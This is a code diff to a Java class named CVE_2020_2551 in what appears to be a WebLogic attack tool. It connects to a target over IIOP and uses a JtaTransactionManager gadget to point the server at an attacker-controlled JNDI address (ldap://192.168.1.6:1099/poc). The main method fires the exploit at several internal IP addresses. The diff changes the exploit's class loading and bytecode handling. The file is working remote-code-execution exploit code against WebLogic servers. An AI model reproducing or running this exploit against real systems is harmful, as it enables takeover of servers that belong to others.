@@ -3,16 +3,12 @@ package com.r4v3zn.weblogic.tools.payloads.impl;
 import com.r4v3zn.weblogic.tools.annotation.Authors;
 import com.r4v3zn.weblogic.tools.annotation.Dependencies;
 import com.r4v3zn.weblogic.tools.annotation.Versions;
-import com.r4v3zn.weblogic.tools.entity.MyException;
 import com.r4v3zn.weblogic.tools.gadget.impl.JtaTransactionManagerGadget;
 import com.r4v3zn.weblogic.tools.payloads.VulTest;
 import javassist.*;
 import lombok.extern.log4j.Log4j2;
-import org.apache.logging.log4j.Level;
-
 import javax.naming.Context;
 import javax.naming.InitialContext;
-import java.lang.reflect.Method;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLClassLoader;
@@ -80,7 +76,7 @@ public class CVE_2020_2551 implements VulTest {
         ClassPool classPool = null;
         try{
             urlClassLoader = loadClass(version);
-            classPool = hookSocket(ip, port);
+//            classPool = hookSocket(ip, port);
         }catch (Exception e){
             e.printStackTrace();
             return false;
@@ -94,12 +90,6 @@ public class CVE_2020_2551 implements VulTest {
         env.put("java.naming.provider.url" , String.format("iiop://%s:%s", ip, port));
         Context context = null;
         try {
-//            Loader loader = new Loader(classPool);
-//            Class clazz = loader.loadClass("weblogic.jndi.WLInitialContextFactory");
-//            clazz = Class.forName("weblogic.jndi.WLInitialContextFactory");
-//            clazz.getDeclaredMethod("getInitialContext", Hashtable.class).invoke(clazz.newInstance(), env);
-//            Method method = clazz.getDeclaredMethod("getInitialContext", Hashtable.class);
-//            method.invoke(objectClient, env);
             context = new InitialContext(env);
         } catch (Exception e) {
             e.printStackTrace();
@@ -110,7 +100,6 @@ public class CVE_2020_2551 implements VulTest {
         try {
             object = payload.getObject(jndiUrl,urlClassLoader);
         } catch (Exception e) {
-            e.printStackTrace();
             urlClassLoader.close();
             return false;
         }
@@ -140,6 +129,7 @@ public class CVE_2020_2551 implements VulTest {
         System.out.println("[*] load class com.bea.core.repackaged.springframework.spring.jar version --> "+version);
 //        log.debug("[*] load class com.bea.core.repackaged.springframework.spring.jar version --> "+version);
         String path = this.getClass().getResource("/lib/").getPath();
+        // Thread.currentThread().getContextClassLoader()
         String pocNamePath = path +"12.2.1.3.0/" + POC_NAME;
         String pocLogPath = path +"12.2.1.3.0/" + POC_LOG;
         String fullClientPath = path + FULL_CLIENT;
@@ -151,8 +141,8 @@ public class CVE_2020_2551 implements VulTest {
         System.out.println("[*] jat log path --> "+pocLogPath);
 //        log.debug("[*] jat path --> "+pocNamePath);
 //        log.debug("[*] jat log path --> "+pocLogPath);
-        URL[] urls = new URL[]{new URL("file:"+pocNamePath), new URL("file:"+pocLogPath)};
-        return new URLClassLoader(urls);
+        URL[] urls = new URL[]{new URL("file:"+pocNamePath), new URL("file:"+pocLogPath), new URL("file:"+fullClientPath)};
+        return new URLClassLoader(urls,Thread.currentThread().getContextClassLoader());
     }
 
     /**
@@ -185,7 +175,8 @@ public class CVE_2020_2551 implements VulTest {
             ctClass.defrost();
         }
         ctMethod.setBody(code);
-        ctClass.toClass();
+        ctClass.writeFile();
+//        ctClass.toClass();
         ctClass.freeze();
         return cp;
     }
@@ -204,8 +195,10 @@ public class CVE_2020_2551 implements VulTest {
     public static void main(String[] args) throws Exception {
         CVE_2020_2551 vul = new CVE_2020_2551();
         String jdnUrl = "ldap://192.168.1.6:1099/poc";
+        System.out.println(vul.vulnerable("192.168.1.3", 7001,jdnUrl));
         System.out.println(vul.vulnerable("192.168.1.10", 7001,jdnUrl));
-        vul.vulnerable("192.168.1.12", 7001,jdnUrl);
+        System.out.println(vul.vulnerable("192.168.1.12", 7001,jdnUrl));
+
 //        vul.vulnerable("192.168.1.3", 7001,jdnUrl);
     }
 }
